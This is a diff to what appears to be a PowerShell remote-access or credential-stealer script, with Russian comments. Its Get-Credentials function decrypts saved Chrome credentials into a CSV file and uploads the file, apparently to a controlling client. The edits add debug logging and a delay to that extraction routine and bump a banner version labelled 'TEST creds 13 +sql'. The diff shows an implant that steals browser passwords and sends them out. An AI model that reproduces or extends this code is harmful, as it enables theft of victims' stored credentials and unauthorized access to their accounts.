@@ -516,11 +516,14 @@ function Get-Credentials {
     try {
         $chromeCreds = Get-DecryptedChromeCreds
 
+        Output-Log "[DEBUG] chromeCreds raw: '$chromeCreds'"
+        Start-Sleep -Milliseconds 300  # дать время системе создать файл
+
         if ((Test-Path $chromeCreds) -and ($chromeCreds -like "*.csv")) {
             Output-Log "[+] Chrome creds saved to file: $chromeCreds"
             $upload = Upload-File $chromeCreds
-            Output-Log $upload  # <- Важно!
-            return $upload      # <- Чтобы клиент принял
+            Output-Log $upload
+            return $upload
         } else {
             Output-Log "[ERROR] Chrome creds extraction returned non-path result:"
             Output-Log "$chromeCreds"
@@ -532,6 +535,7 @@ function Get-Credentials {
         return "[ERROR] Credential extraction failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
@@ -762,7 +766,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                            TEST creds 12 +sql
+                                            TEST creds 13 +sql
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
